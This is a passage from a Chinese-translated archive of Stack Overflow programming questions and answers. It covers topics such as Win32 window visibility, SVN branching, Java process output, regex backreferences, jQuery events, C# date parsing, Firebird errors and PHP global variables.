  HWND hWnd;
  BOOL ret;
  MSG msg;

  wcex.lpfnWndProc = MainWindowProc;
  wcex.hInstance = hInstance;
  wcex.hIcon = LoadIcon(NULL, IDI_APPLICATION);
  wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
  wcex.hbrBackground = GetSysColorBrush(COLOR_WINDOW);
  wcex.lpszClassName = TEXT("MainWindow");
  wcex.hIconSm = wcex.hIcon;

  RegisterClassEx(&wcex);
  hWnd = CreateWindow(wcex.lpszClassName, TEXT("Test"), WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, HWND_DESKTOP, NULL, hInstance, NULL);

  // ShowWindow(hWnd, nCmdShow);
  UpdateWindow(hWnd);

  while ((ret = GetMessage(&msg, NULL, 0, 0)) != 0)
  {
    if (ret == -1)
    {
      return 1;
    }
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }
  return msg.wParam;
}

LRESULT CALLBACK MainWindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
  switch (uMsg)
  {
    HANDLE_MSG(hWnd, WM_CREATE, MainWindow_OnCreate);
    HANDLE_MSG(hWnd, WM_DESTROY, MainWindow_OnDestroy);
    HANDLE_MSG(hWnd, WM_SIZE, MainWindow_OnSize);
  default:
    return DefWindowProc(hWnd, uMsg, wParam, lParam);
  }
}

BOOL MainWindow_OnCreate(HWND hWnd, LPCREATESTRUCT lpCreateStruct)
{
  SetWindowPos(hWnd, NULL, 100, 100, 300, 300, SWP_NOREDRAW | SWP_NOZORDER);
  return TRUE;
}

void MainWindow_OnDestroy(HWND hWnd)
{
  PostQuitMessage(0);
}

void MainWindow_OnSize(HWND hWnd, UINT state, int cx, int cy)
{
  SetWindowRedraw(hWnd, FALSE);
  SetWindowRedraw(hWnd, TRUE);
  RedrawWindow(hWnd, NULL, NULL, RDW_ERASE | RDW_FRAME | RDW_INVALIDATE | RDW_ALLCHILDREN) ;
} 
```

运行此程序，将显示一个窗口，而无需调用`ShowWindow`. 但如果评论

```
SetWindowRedraw(hWnd, FALSE);
SetWindowRedraw(hWnd, TRUE); 
```

那么窗口将保持隐藏状态。

有人可以解释一下吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T14:13:02.123

`SetWindowRedraw()`是一个将`WM_SETREDRAW`消息（使用`SendMessage()`）发送到窗口的宏。

当一个窗口收到这样的消息时，它的样式集就会`WS_VISIBLE`添加样式。

来自 MSDN ( [WM_SETREDRAW](http://msdn.microsoft.com/en-us/library/windows/desktop/dd145219%28v=vs.85%29.aspx) ) 的逐字记录：

> [...] 如果应用程序将 WM_SETREDRAW 消息发送到隐藏窗口，则窗口变为可见（即操作系统将 WS_VISIBLE 样式添加到窗口）。[...]

# svn - SVN 和部署：保持卫生环境

> ID：13530425
> 
> 赞同：1
> 
> 时间：2012-11-23T13:49:02.410
> 
> 标签：svn

我的团队在使用 SVN 部署到我们的 QA 环境以进行测试和保持 DEV 流清洁时遇到问题，以便我们可以在 QA 进行时继续开发。

我希望有一些方法可以解决我们尚未遇到的问题。

详细信息：我们在 SVN 中有一个 DEV 分支和一个用于 UI 开发人员的代码库和另一个用于服务器开发人员的代码库。

当我们部署时，.EXE 和 .SWF 文件被检入服务器端文件夹，服务器开发人员推送到 TRUNK。WAR 文件是从那里构建的。

问题在于，随着 QA 的进行，服务器开发人员继续致力于未来的功能和错误，并且需要推送到 QA 环境，以便针对 UI 测试他们的代码。

我们没有专门的 DEV 环境；我们知道这是问题的很大一部分。

问题是; 我们是否还需要在 SVN 中使用另一个分支来进行 QA？那么，每次我们推送到 QA 时，我们都会将代码放在 QA 分支中？

通过这种方式，我们可以保持环境卫生，并且可以随时构建 QA SVN 分支。

我认为，与大多数团队不同，我们在推进 QA 时不会停止开发。我们继续前进并解决 QA 发现的错误。基本上，只要我们愿意，我们就会推动 PROD。这就是为什么我们需要一个卫生的环境。

很抱歉这篇文章很长，但我们在这里有点陈词滥调。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T15:01:28.320

我认为这个问题与颠覆没有太大关系。听起来您已经发现了问题——您正在使用单一环境进行 DEV 测试和 QA 测试。对于这两个功能，您应该有两个环境。

就您的分支策略而言，我建议您遵循[每个发布分支的](http://svnbook.red-bean.com/en/1.7/svn.branchmerge.commonpatterns.html#svn.branchmerge.commonpatterns.release)工作流程，每次您想要发布到 QA，然后再发布到 PROD 时，您都会从主干中剪切一个新的发布分支。您不应该*将*代码从主干推送到静态 QA 或 PROD 分支——您应该在每次发布时剪切一个*新分支。*

最后，我建议您将二进制/可部署管理与源代码管理分开。不要在代码旁边的 svn 中保留最新的 .exe 文件的副本。如果您想将构建工件保留在 svn 中，我建议设置您的持续构建过程以将工件发布到单独的 svn 存储库（此过程也可以将它们发布到简单的文件共享，这可能更易于使用）。您希望避免需要任何手动过程来使您的二进制文件保持“最新”。

# java - 读取命令的实时输出

> ID：13530429
> 
> 赞同：4
> 
> 时间：2012-11-23T13:49:19.367
> 
> 标签：java, android

如何从 Java 读取 shell 命令的实时输出

这是我到目前为止所拥有的，但它在命令执行后打印：

```
try {
    proc = Runtime.getRuntime().exec("du -d 1 /sdcard/");

    InputStream inputStream = proc.getInputStream();
    InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
    BufferedReader bufferedReader = new BufferedReader(inputStreamReader);

    while ((line = bufferedReader.readLine()) != null) {
        publishProgress(i);
        i++;
        System.out.println(line); // it prints all at once after command has been executed.
    }
}
catch (IOException e) {
    Log.e("du","error "+e.getMessage());
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-02-14T08:26:47.550

尝试这个：

```
try {
 proc = Runtime.getRuntime().exec("du -d 1 /sdcard/");

 InputStream inputStream = proc.getInputStream();
 InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
 BufferedReader bufferedReader = new BufferedReader(inputStreamReader);

 while ((line = bufferedReader.readLine()) != null) {
    System.out.println(line); // it prints all at once after command has been executed.
 }
 proc.waitFor();
}
catch (IOException e) {
 Log.e("du","error "+e.getMessage());
} 
```

# python - 正则表达式匹配不同地方的 2 个相同的字符类

> ID：13530433
> 
> 赞同：0
> 
> 时间：2012-11-23T13:49:28.297
> 
> 标签：python, regex

我正在尝试确定是否可以将多个正则表达式压缩为一个，但不能完全实现。

我正在尝试寻找一对匹配的字符，这可能是一个范围内的字符。

例如

```
1 text 1     <--- This is a match
1 text 2     <--- This is not a match
2 text 1     <--- This is a match 
```

选项列表是有限的，所以我知道我可以单独测试每个案例，例如：

```
1(.+?)1
2(.+?)2 
```

但是，我试图在一个查询中使用分组来执行此操作。类似于以下内容：

```
[1-8](.+?)[1-8] 
```

但这（不正确）匹配：

```
1 text 2     <--- This is not a match 
```

有没有办法可以确保第二个括号列表匹配与第一个括号中的匹配相同？即如果第一个匹配1，那么第二个也必须是1？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T13:51:27.230

您需要使用组，然后引用该组

```
([1-8])(?:.+?)\1 
```

`\1`指的是`first`捕获的组，即`([1-8])`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T13:55:06.510

您想使用[反向引用](http://www.regular-expressions.info/brackets.html)

```
([1-8])(.+?)\1 
```

这样，前后字符必须匹配才能使整个事物被视为匹配。

# jquery - 单击链接更改SRC ..我做错了什么？

> ID：13530444
> 
> 赞同：1
> 
> 时间：2012-11-23T13:50:13.750
> 
> 标签：jquery, hyperlink, click, src

我目前正在创建某种幻灯片。这只是一个平面图，所以看起来不应该很整洁。我正在使用链接编号来指定楼层。单击其中一个链接时，将显示相应的楼层图像。

在我目前拥有的代码下方..但图像的 src 在点击时不会改变。我究竟做错了什么？

谢谢！

```
 <div id="bovengedeelte">
        <img src="image1.png" id="plattegrond" width="300" height="300" alt="plattegrond" />
        </div>

        <div id="ondergedeelte">
        <script type="text/javascript">
        $("a.floor0").click(function(event){
          $("img.plattegrond").attr("src","floor0.png");
        });
            $("a.floor1").click(function(event){
          $("img.plattegrond").attr("src","floor1.png");
        });     
            $("a.floor2").click(function(event){
          $("img.plattegrond").attr("src","floor2.png");
        });     
        $("a.floor3").click(function(event){
          $("img.plattegrond").attr("src","floor3.png");
        });         
        $("a.floor4").click(function(event){
          $("img.plattegrond").attr("src","floor4.png");
        });         
        $("a.floor5").click(function(event){
          $("img.plattegrond").attr("src","floor5.png");
        });         </script>
        <p>Kies een verdieping</p>
        <a id="floor0" href="#">0</a><a id="floor1" href="#">1</a><a id="floor2" href="#">2</a><a id="floor3" href="#">3</a><a id="floor4" href="#">4</a><a id="floor5" href="#">5</a>
        </div> 
```

**对所有人：在您的所有解决方案之后它仍然无法正常工作。已经谢谢了！有人可以检查整个代码，看看我做错了什么吗？：秒

```
http://prototyping.iscs.nl/ 
```

**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T13:59:29.443

你只需要这样：

**[小提琴演示](http://jsfiddle.net/WDx8p/)**

```
 <div id="bovengedeelte">
          <img src="image1.png" id="plattegrond" width="300" height="300" alt="plattegrond" />
    </div>

    <div id="ondergedeelte">

        <p>Kies een verdieping</p>
        <a href="#">1</a>
        <a href="#">2</a>
        <a href="#">3</a>
        <a href="#">4</a>
        <a href="#">5</a>

    </div> 
```

问：

```
$(function(){ // document ready shorthand

    $('#ondergedeelte a').click(function( e ){
         e.preventDefault();
         var newImgUrl = 'floor'+ $(this).text() +'.png' ;
         $('#plattegrond').attr('src', newImgUrl );
    });

}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T13:56:33.670

因为您在 jQuery 选择器中使用类而不是 id。此外，您可以像这样缩短您的 jQuery 代码 -

```
$('a').click(function(e) {
    e.preventDefault();
    var thisNumber = id.substr(id.length - 1);
    $('img#plattergrond').attr('src', 'floor' + thisNumber + '.png');
}); 
```

现在，无论添加多少链接或图像，它们都将得到正确处理。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-23T13:54:32.247

因此，您没有正确搜索`a`with`class`而不是您拥有的`id`. 这将起作用：

```
$("a#floor5").click(function(event) {
    $("img#plattegrond").attr("src","floor5.png");
}); 
```

评论中的@Jay Blanchard 完全正确。

此外，调试并查看是否找到正确元素的一个好方法是`console.log`使用 jQuery 对象，如下所示：`console.log($("a#floor5"));`如果它打印出您正在寻找的元素，那么您可以继续。

# magento - 无法为 magento 扩展设置默认配置

> ID：13530446
> 
> 赞同：0
> 
> 时间：2012-11-23T13:50:18.823
> 
> 标签：magento

我们正在运行 Magento 1.7.0 并尝试为此进行扩展。该扩展需要一些配置，我们在 etc/config.xml 中配置它们。问题是我们将无法为这些配置设置默认值我们的字段定义：

```
<config>
  <sections>
    <mymodule_options translate="label" module="mymodule_core">
      <label>Mymodule Core Options</label>
      <tab>mymodule_config</tab>
      <frontend_type>text</frontend_type>
      <sort_order>1000</sort_order>
      <show_in_default>1</show_in_default>
      <show_in_website>1</show_in_website>
      <show_in_store>1</show_in_store>
      <groups>
        <api translate="label">
          <label>Advanced Options</label>
          <frontend_type>text</frontend_type>
          <sort_order>1</sort_order>
          <show_in_default>1</show_in_default>
          <show_in_website>1</show_in_website>
          <show_in_store>1</show_in_store>
          <expanded>1</expanded>
          <fields>
            <api_key>
              <label>API Key</label>
              <frontend_type>text</frontend_type>
              <sort_order>1</sort_order>
              <show_in_default>1</show_in_default>
              <show_in_website>1</show_in_website>
              <show_in_store>1</show_in_store>
            </api_key>
            <server_host>
              <label>Server Host</label>
              <frontend_type>text</frontend_type>
              <sort_order>2</sort_order>
              <show_in_default>1</show_in_default>
              <show_in_website>1</show_in_website>
              <show_in_store>1</show_in_store>
            </server_host>
            <server_port>
              <label>Server Port</label>
              <frontend_type>text</frontend_type>
              <sort_order>3</sort_order>
              <show_in_default>1</show_in_default>
              <show_in_website>1</show_in_website>
              <show_in_store>1</show_in_store>
          </server_port>
        </fields>
        </api>
      </groups>
    </mymodule_options>
  </sections>
  <default>
    <mymodule_options>
      <api>
        <server_host>mymodule.herokuapp.com</server_host>
        <server_port>80</server_port>
      </api>
    </mymodule_options>
  </default>              
</config> 
```

然后我们从 core_config_data 中删除相关行，然后 error_log 这些值： `Mage::getStoreConfig('mymodule_options/api/server_host')` 但是我们得到的是一个 NULL 值。如果我们在管理配置界面中将该值设置为随机值，那么无论如何我们都会得到该值。我们做错了什么，默认值声明不起作用？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T17:09:30.557

正如 RS 在评论中所说，您`<sections>`应该进入 system.xml 和`<default>`config.xml。

# bluetooth - 指定 LUP_FLUSHCACHE 时 WSALookupServiceBegin 崩溃

> ID：13530447
> 
> 赞同：0
> 
> 时间：2012-11-23T13:50:22.427
> 
> 标签：bluetooth

我有一个 C++/CLI dll 实现了一些由 .NET 应用程序加载的蓝牙功能。如果 dll 是用 .NET 3.5 编译的（应用程序也是如此），一切正常。

我已将 dll 更新为 .NET 4.0（在 VS 2010 中）和平台工具集 v100（VS2010）；当然，该应用程序已更新到相同版本的 .NET 框架。从那时起，如果我指定 LUP_FLUSHCACHE 标志，WSALookupServiceBegin 就会崩溃。

这是代码：

```
HANDLE hLookup = 0;
WSAQUERYSET qs;
::memset(&qs, 0, sizeof(WSAQUERYSET));

// Start the lookup service
qs.dwSize = sizeof(WSAQUERYSET);
qs.dwNameSpace = NS_BTH;

iResult = ::WSALookupServiceBegin(&qs, LUP_CONTAINERS | LUP_RETURN_TYPE | LUP_RETURN_NAME | LUP_RETURN_ADDR | LUP_FLUSHCACHE, &hLookup); **<= Crash here** 
```

指示的错误是 -1073740791 (0xc0000409)（如果检查 ntstatus.h，则缓冲区溢出）。

我已经尝试了一切，添加了一个blob（以指定查询期）等。问题仍然存在。

Winsock 已正确初始化，连接（到 BT SPP 设备）工作正常。只有设备查询崩溃。

有人知道我为什么会遇到这次崩溃吗？

谢谢， 阿莱克

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-29T17:49:38.103

您是否尝试过将 WSAQUERYSET 初始化为零？

```
memset(&qs, 0, sizeof(WSAQUERYSET)); 
```

有时系统会将您的 WSAQUERYSET 初始化为垃圾 - 这可能会导致您的缓冲区溢出。

# python - 如何从 Ant 运行 Pylint

> ID：13530448
> 
> 赞同：1
> 
> 时间：2012-11-23T13:50:26.293
> 
> 标签：python, ant, jenkins, continuous-integration, pylint

我需要从 ant 运行这个命令：

```
pylint -f parseable src/apps/api | tee pylint.out 
```

它输出一个 pylint.out 文件。

我试过这个：

```
<target name="pylint" description="Pylint">
    <exec executable="pylint">
        <arg line="-f parseable src/apps/api | tee ${basedir}/pylint.out"/>
    </exec>
</target> 
```

但这不会产生 pylint.out 文件。有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T14:13:55.090

似乎 ant 会将您的管道 ( `|`) 视为参数而不是 shell 的命令。

一种解决方案是将您的命令提取到脚本中：

**pylint.sh：**

```
#!/bin/bash
pylint -f parseable src/apps/api | tee $1/pylint.out 
```

然后从`<exec>`任务中运行该脚本：

**构建.xml：**

```
<target name="pylint" description="Pylint">
    <exec executable="pylint.sh">
        <arg line="${basedir}"/>
    </exec>
</target> 
```

这显然不是跨平台的，可能有我没有想到的更好的方法，但是如果需要，您可以拥有一个等效`.bat`文件并[在 ANT 中进行操作系统检测，](https://stackoverflow.com/questions/453170/using-ant-to-detect-os-and-set-property)以使其在 Windows 上运行。

# iphone - UIPopoverController 上的 UIImagePicker 在单击或触摸时关闭

> ID：13530450
> 
> 赞同：0
> 
> 时间：2012-11-23T13:50:49.827
> 
> 标签：iphone, objective-c, ios, ipad

我尝试使用以下代码在 UIPopoverController 上调整 UIImagePickerController 的大小：

```
 UIImagePickerController *imagePicker =[[UIImagePickerController alloc] init];
            imagePicker.delegate = self;
            imagePicker.sourceType =
            UIImagePickerControllerSourceTypePhotoLibrary;
            imagePicker.mediaTypes = [NSArray arrayWithObjects:
                                      (NSString *) kUTTypeImage,
                                      nil];
            imagePicker.allowsEditing = YES;
           UIViewController *containerController = [[UIViewController alloc] init];
            containerController.contentSizeForViewInPopover = CGSizeMake(360,200);
           [containerController.view addSubview:imagePicker.view];
            self.popoverController = [[UIPopoverController alloc]
                                      initWithContentViewController:imagePicker];

             self.popoverController.delegate = self;
            [self.popoverController setPopoverBackgroundViewClass:[PopoverBackgroundView class]];

     [self.popoverController presentPopoverFromRect:CGRectMake(512,510,10,10) inView:mC.view permittedArrowDirections:UIPopoverArrowDirectionDown animated:FALSE];
            } 
```

imagePicker 完全按照我的意愿填充，但是当我触摸 popover 内的 imagePicker 的单元格时，它突然熄灭或变空。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T14:29:21.340

如果您想在 UIPopoverController 将/确实被解雇时访问 UIImagePickerController ，请使用 UIPopoverControllerDelegate 方法：

```
- (BOOL)popoverControllerShouldDismissPopover:(UIPopoverController *)popoverController{
    UIImagePickerController *imagePicker = (UIImagePickerController*)popoverController.contentViewController;
    return YES;
} 
```

可以帮助你:)

# c# - 加入 1 个日期字符串 + 1 个时间字符串并转换为日期时间

> ID：13530454
> 
> 赞同：0
> 
> 时间：2012-11-23T13:51:00.167
> 
> 标签：c#, datetime

我正在从 excel 文件中读取 2 列：

一列有值：07/11/2012

第二列有值：18:45

当我阅读第二列时，它实际上在它前面显示了一个默认日期。dr[3].ToString() "30/12/1899 6:45:00 PM" 字符串

我想加入第一列和第二列。但现在我有正常的输入格式异常

我尝试使用字符串操作从第二列中删除日期部分

这是我的代码

```
 DateTime dateEvent = DateTime.Parse(dr[1].ToString());
        dateEvent.Add(TimeSpan.Parse(dr[3].ToString().Substring(dr[3].ToString().IndexOf(" ")+1))); 
```

**更新1：**

```
DateTime dateEvent = DateTime.ParseExact(string.Format("{0} {1}", dr[1].ToString(), dr[3].ToString().IndexOf(" ") + 1), "dd/MM/yyyy HH:mm", CultureInfo.InvariantCulture); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:54:16.677

尝试[`DateTime.ParseExact`方法](http://msdn.microsoft.com/en-us/library/w2sa9yss.aspx)：

```
string date = dr[1].ToString();
string time = dr[3].ToString();
time = time.Substring(time.IndexOf(' ') + 1);
DateTime.ParseExact(string.Format("{0} {1}", date, time), "dd/MM/yyyy HH:mm:ss tt", CultureInfo.InvariantCulture); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T13:54:48.080

编辑：再看一遍，我强烈怀疑你根本不需要做任何解析。我怀疑你可以使用：

```
DateTime date = ((DateTime) dr[1]).Date;
TimeSpan time = ((DateTime) dr[3]).TimeOfDay;
DateTime combined = date + time; 
```

您不应该只是盲目地调用`ToString()`值，而不了解类型是什么：通常它正是正确的类型，并且您可以为自己节省可能有损失的字符串转换。

* * *

假设您*必须*解析（而不是让 Excel 为您转换为 a `DateTime`），我建议`DateTime.ParseExact`对这两个部分都使用：

*   对于第一部分，使用格式`dd/MM/yyyy`
*   对于第二部分，使用格式`dd/MM/yyyy hh:mm tt`

我建议明确使用不变的文化——假设你真的知道这种格式是完全固定的。（如果你不这样做，那就是一个更大的问题。）

然后像这样将它们连接在一起：

```
DateTime combined = date.Date + time.TimeOfDay; 
```

或者，您可以使用我的[Noda Time](http://noda-time.googlecode.com)库，它有单独的`LocalDate`和`LocalTime`概念，可以很容易地组合成一个`LocalDateTime`...

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-23T14:00:35.167

我建议使用[DateTime.ParseExact](http://msdn.microsoft.com/en-us/library/w2sa9yss.aspx)这样您就可以*明确*说明您需要日期的哪些部分，例如

```
var date = DateTime.ParseExact(dr[1], "dd/MM/yyyy", CurrentCulture.InvariantCulture).Date;
var time = DateTime.ParseExact(dr[3], "HH:mm", CurrentCulture.InvariantCulture).TimeOfDay;
var eventDate = date + time; 
```

# delphi - Firebird 错误错误代码 = -206 列未知

> ID：13530457
> 
> 赞同：3
> 
> 时间：2012-11-23T13:51:07.453
> 
> 标签：delphi, firebird, devart

我使用带有 Delphi 的 IBDac 连接到 Firebir db，当我尝试运行该软件时突然出现此错误

> 动态 SQL ErrorSQL 错误代码 = -206 Column unknown table1.MyField_ID 第 6 行第 18 列

当我尝试打开数据集时出现错误

```
mydataset.open; 
```

该列当然存在。它是另一个表的外键。我真的不知道为什么我会收到这个错误！这是我在组件中使用的 SQL：

```
CREATE TABLE table1 (
      pkfield1 INTEGER NOT NULL,
      field_no INTEGER NOT NULL,
      fk1_id INTEGER NOT NULL,
      fk2_id INTEGER,
      MyField_ID INTEGER,
      bfield INTEGER);     

  select 
        table1.pkfield1,
        table1.field_no,
        table1.fk1_id,
        table1.fk2_id,
        table1.MyField_ID, <<<------- the field that cause the error
        table1.bfield,
        table2.desc1,
        table2.desc2,
        table2.desc3
    from table2
    right outer join table1 on (table2.pk1_id = table1.fk1_id)
    Order by table1.fk1_id, table1.field_no desc 
```

请指教

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T15:10:28.310

更改您的大小写，因为如果您使用 CamelCase，您的数据库层会自动引用它。

此处对 Firebird 2.5 数据库进行的快速测试显示：

```
SQL> select t1.usuario, t1.NoExisto from sg_usuario t1;
Statement failed, SQLSTATE = 42S22
Dynamic SQL Error
-SQL error code = -206
-Column unknown
-T1.NOEXISTO
-At line 1, column 23

SQL> select t1.usuario, "t1.NoExisto" from sg_usuario t1;
Statement failed, SQLSTATE = 42S22
Dynamic SQL Error
-SQL error code = -206
-Column unknown
-t1.NoExisto
-At line 1, column 34 
```

如您所见，数据库引擎仅在使用引号获取 SQL 查询时才会生成驼峰式错误。

我建议您尝试**myfield_id**或使用字段名称中的正确大小写。

```
 select 
        table1.pkfield1,
        table1.field_no,
        table1.fk1_id,
        table1.fk2_id,
        table1.myfield_id, 
        table1.bfield,
        table2.desc1,
        table2.desc2,
        table2.desc3
    from table2
    right outer table1 on (table2.pk1_id = table1.fk1_id)
    Order by table1.fk1_id, table1.field_no desc 
```

# c# - String.Equals 的奇怪行为？

> ID：13530459
> 
> 赞同：3
> 
> 时间：2012-11-23T13:51:19.217
> 
> 标签：c#, .net, string, object, equals

我有一个字典，它的键为字符串。

一项具有特殊行为。对于相同的字符串，它不匹配。我想这与 String.Equals 行为有关。

甚至 String.Equals 返回错误的结果。（我知道字符串实习生的概念，但这似乎是不同的问题）。

检查图像（观察窗口）是否存在问题。 ![在此处输入图像描述](../Images/58317971768fb0d0fbf0826e86e4b7ea.png)

我将映射字典（来自 xml 资源文件）填充为

```
var data = XDocument.Parse(str).Element(RootForXMLValidation).Elements().Where(x => x.Attribute("EcbFieldId") != null);
mappings = data.ToDictionary(x => x.Attribute("BoeField").Value.Trim(),
           x => new Mapping { Key = x.Attribute("BoeField").Value.Trim(),
           Type = (MappingType)Enum.Parse(typeof(MappingType), 
           x.Attribute("mappingType").Value), MappingDetail = x }); 
```

为什么 String.Equals 会这样？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-23T13:52:25.600

破折号`key`似乎是一个破折号，而另一个是连字符。

# php - 动态常量名

> ID：13530463
> 
> 赞同：2
> 
> 时间：2012-11-23T13:51:27.953
> 
> 标签：php, constants

我对动态常量名称声明有一点问题。我不知道为什么定义 $constName 的表达式没有被正确评估：

这是我的代码：

```
$type2 = "type2";
$env = "env";

$constName = "test_$type2_$env";
return constant(__CLASS__."::$constName"); 
```

之后，我没有得到正确的值：test_type2_env，而是这个：test_env

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:52:02.663

尝试

```
$constName = "test_{$type2}_$env"; 
```

因为 PHP 知道您需要 'type2_' 变量的值。

# php - 如何在php中声明一个全局变量？

> ID：13530465
> 
> 赞同：187
> 
> 时间：2012-11-23T13:51:44.927
> 
> 标签：php, global-variables, global

我有这样的代码：

```
<?
    $a="localhost";
    function body(){
        global $a;
        echo $a;
    }

    function head(){
        global $a;
        echo $a;
    }

    function footer(){
        global $a;
        echo $a;
    }
?> 
```

有没有办法在一个地方定义全局变量并让`$a`所有函数都可以访问该变量？不使用`global $a;`更多？

* * *

## 回答 #1

> 赞同：282
> 
> 时间：2012-11-23T13:56:10.200

[`$GLOBALS`](http://php.net/manual/en/reserved.variables.globals.php)可以使用数组代替：

```
$GLOBALS['a'] = 'localhost';

function body(){

    echo $GLOBALS['a'];
} 
```

从[手册](http://php.net/manual/en/reserved.variables.globals.php)：

> 一个关联数组，包含对当前在脚本全局范围内定义的所有变量的引用。变量名是数组的键。

* * *

如果您有一组需要一些公共变量的函数，那么具有属性的类可能是一个不错的选择，而不是全局：

```
class MyTest
{
    protected $a;

    public function __construct($a)
    {
        $this->a = $a;
    }

    public function head()
    {
        echo $this->a;
    }

    public function footer()
    {
        echo $this->a;
    }
}

$a = 'localhost';
$obj = new MyTest($a); 
```

* * *

## 回答 #2

> 赞同：84
> 
> 时间：2012-11-23T13:55:50.687

如果变量不会改变，你可以使用[`define`](http://php.net/define)

例子：

```
define('FOOTER_CONTENT', 'Hello I\'m an awesome footer!');

function footer()
{
    echo FOOTER_CONTENT;
} 
```

* * *

## 回答 #3

> 赞同：36
> 
> 时间：2018-03-28T17:09:53.960

如果变量在函数之外声明，则它已经在全局范围内。所以没有必要声明。但是从你调用这个变量的地方必须可以访问这个变量。如果您从函数内部调用，则必须使用`global`关键字：

```
$variable = 5;

function name()
{
    global $variable;

    $value = $variable + 5;

    return $value;  

} 
```

在函数外部使用 global 关键字不是错误。如果要将此文件包含在函数中，可以将变量声明为`global`.

```
// config.php

global $variable;

$variable = 5; 
```

* * *

```
// other.php

function name()
{
    require_once __DIR__ . '/config.php';
} 
```

你也可以使用`$GLOBALS`。它是一个超全球，因此它可以访问任何地方。

```
$GLOBALS['variable'] = 5;

function name()
{
    echo $GLOBALS['variable'];
} 
```

根据您的选择，您可以选择其中任何一个。

* * *

## 回答 #4

> 赞同：31
> 
> 时间：2012-11-23T13:55:58.273

在 $GLOBALS 超级全局数组中添加变量，例如

```
$GLOBALS['variable'] = 'localhost'; 
```

并在全球范围内使用

或者您可以使用可在整个脚本中访问的常量

```
define('HOSTNAME', 'localhost'); 
```

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2016-07-12T18:46:26.260

这个答案已经很晚了，但我所做的是设置一个将布尔值、数组和整数初始值保存为全局范围静态变量的类。任何常量字符串都是这样定义的。

```
define("myconstant", "value"); 

class globalVars {

    static $a = false;

    static $b = 0;

    static $c = array('first' => 2, 'second' => 5);

}

function test($num) {

    if (!globalVars::$a) {

        $returnVal = 'The ' . myconstant . ' of ' . $num . ' plus ' . globalVars::$b . ' plus ' . globalVars::$c['second'] . ' is ' . ($num + globalVars::$b + globalVars::$c['second']) . '.';

        globalVars::$a = true;

    } else {

        $returnVal = 'I forgot';

    }

    return $returnVal;

}

echo test(9); ---> The value of 9 + 0 + 5 is 14.

echo "<br>";

echo globalVars::$a; ----> 1 
```

`static`关键字必须出现在类中，否则变量 $a、$b 和 $c 将不会是全局范围的。

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2016-08-08T13:32:58.570

如果这符合您的意图，您可以尝试使用**Closure**函数或**Lambdas**`use`中的关键字......不过 PHP 7.0。并不是这样更好，而只是一种选择。

 ****```
$foo = "New";
$closure = (function($bar) use ($foo) {
    echo "$foo $bar";
})("York"); 
```

[演示](https://3v4l.org/VqOFK)| [信息](http://culttt.com/2013/03/25/what-are-php-lambdas-and-closures/)

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2012-11-23T13:55:26.970

您以编写问题的方式回答了这个问题-使用“定义”。但是一旦设置，您就无法更改定义。

或者，您可以使用类中的常量技巧，例如 class::constant。您还可以通过向类声明静态属性来使它们可变，如果您想更改静态属性，可以使用函数来设置它。

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2019-02-10T14:38:41.493

您可以将全局变量声明为静态属性：

```
class global {
    static $foo = "bar";
} 
```

你可以在任何你喜欢的**地方使用和修改它，比如：**

```
function echo_foo() {
    echo global::$foo;
} 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2018-03-23T16:17:07.237

如果您使用过程函数而不是变量并在任何地方调用它们会怎样。

我通常会收集配置值并将它们放在带有 return 语句的函数中。我只是在需要使用全局值并调用特定函数的地方包含了它。

```
function host()
{
   return "localhost";
} 
```

* * *

## 回答 #10

> 赞同：-2
> 
> 时间：2020-05-09T18:36:22.787

`$GLOBALS[]` **是**正确的解决方案，但由于我们正在讨论替代方案，因此函数也可以轻松完成这项工作：

```
function capital() {
    return my_var() . ' is the capital of Italy';
}

function my_var() {
    return 'Rome';
} 
```****

# jquery - jQuery.ajax 新元素检查

> ID：13530471
> 
> 赞同：0
> 
> 时间：2012-11-23T13:52:15.383
> 
> 标签：jquery, ajax, login, refresh, element

我正在尝试使用 ajax 登录网页。我有这个：

```
 $.ajax({
       type: "POST",
       url: "ajax/login.php",
       data: dataString,               
       success: function(answer) {
           $('#loging').html(answer);           
       }      
    }); 
```

它工作正常，但是：答案变量是这样的：

```
 Hi user, <span id="logout_button">Logout</span> 
```

我可以看到按钮“注销”，但我的浏览器不知道这里有任何 span id="logout_button"。我有与#logout_button 绑定的注销代码，但它不起作用，因为我的浏览器对这个按钮一无所知。当我刷新页面时，注销工作正常。

那么，有什么方法/功能可以对 jQuery 说“嗨，伙计，请检查文档上的新元素”？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T13:54:45.977

是的，您可以使用 .delegate() 而不是 .bind()

```
$('body').delegate('#logout_button', 'click', function() {
    //here the code
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T14:20:43.523

对于 jquery 1.7+，最好使用“on”

```
$("body").on("click", "#logout_button", function() {
